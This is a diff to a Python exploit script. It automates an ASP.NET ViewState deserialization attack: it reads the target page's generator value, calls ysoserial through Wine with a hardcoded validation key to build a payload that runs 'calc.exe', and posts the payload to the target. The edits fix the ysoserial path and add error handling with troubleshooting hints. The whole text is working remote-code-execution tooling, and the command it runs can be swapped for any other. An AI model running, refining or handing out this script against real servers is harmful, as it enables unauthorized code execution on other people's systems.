@@ -4,7 +4,6 @@ import re
 import base64
 import sys
 import subprocess
-import urllib
 
 target = sys.argv[1]
 
@@ -36,12 +35,11 @@ def get_viewstate_generator(target):
 
 def gen_payload(validation_key, generator):
     y_so_serial_proc = subprocess.Popen([
-        'wine', 'Release/ysoserial.exe',  '-p', 'ViewState', '-g', 'TextFormattingRunProperties', '--generator', f'{generator}',
+        'wine', 'ysoserial/Release/ysoserial.exe',  '-p', 'ViewState', '-g', 'TextFormattingRunProperties', '--generator', f'{generator}',
         '--validationalg', 'SHA1', '--validationkey', f'{validation_key}', '-c', '"calc.exe"'
         ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     payload, stderr = y_so_serial_proc.communicate()
 #    wine Release/ysoserial.exe -p ViewState -g TextFormattingRunProperties --generator 75BBA7D6 --validationalg SHA1 --validationkey C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45 -c "calc.exe"
-
     return payload.decode('ascii')
 
 
@@ -67,12 +65,23 @@ def send_payload(target, payload, generator):
 
 
 def main():
-    viewstate, generator = get_viewstate_generator(target)
-    print(f"ViewState: {viewstate} , Generator: {generator}")
-    payload = gen_payload(validation_key, generator)
-    print(f"Payload Data: {payload}")
-    print("Sending payload ...")
-    send_payload(target, payload, generator)
+    try:
+        viewstate, generator = get_viewstate_generator(target)
+        print(f"ViewState: {viewstate} , Generator: {generator}")
+    except:
+        print("Issue connecting to webserver, check target?")
+        exit()
+    try:    
+        payload = gen_payload(validation_key, generator)
+        print(f"Payload Data: {payload}")
+    except:
+        print("Error generating payload, check to see if wine installed/winetricks dotnet48 has been successfully executed.\n Alternatively, if on windows, execute the ysoserial directly without Wine.")
+        exit()
+    try:
+        print("Sending payload ... ")
+        send_payload(target, payload, generator)
+    except:
+        print("Error sending payload, check target?")
 
 main()
 
